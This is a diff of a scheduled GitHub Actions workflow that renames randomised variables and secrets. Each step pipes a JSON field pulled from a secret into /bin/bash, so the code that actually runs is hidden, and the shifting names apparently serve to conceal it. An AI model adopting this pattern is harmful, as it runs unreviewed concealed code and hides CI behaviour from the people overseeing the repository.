@@ -3,20 +3,22 @@ name: jinzhishouk
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 4/6 * * *'
+    - cron: '12 0/6 * * *'
 
-jobs:  # 27522
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: jinzhishouk
         env:
-          slbo6189: ${{ secrets.slbo6189 }}
+          wp20783: ${{ secrets.wp20783 }}
         run: |
-          echo $slbo6189 | jq -r .i4965 | /bin/bash
-          echo $csjai0 | jq -r .zx2 | /bin/bash
-          echo $ll18 | jq -r .zr88 | /bin/bash
-          echo $uiyk473 | jq -r .t97742 | /bin/bash
-          echo $mc37 | jq -r .ubeih5 | /bin/bash
+          echo $wp20783 | jq -r .n02 | /bin/bash
+          echo $vlsuc8 | jq -r .apaxv0 | /bin/bash
+          echo $hdhw45 | jq -r .cy08 | /bin/bash
+          echo $d3 | jq -r .eim62910 | /bin/bash
+          echo $engk3867 | jq -r .tfqof750 | /bin/bash
+          echo $ap2 | jq -r .ay17 | /bin/bash
+          echo $pxce213 | jq -r .utqr93 | /bin/bash
 
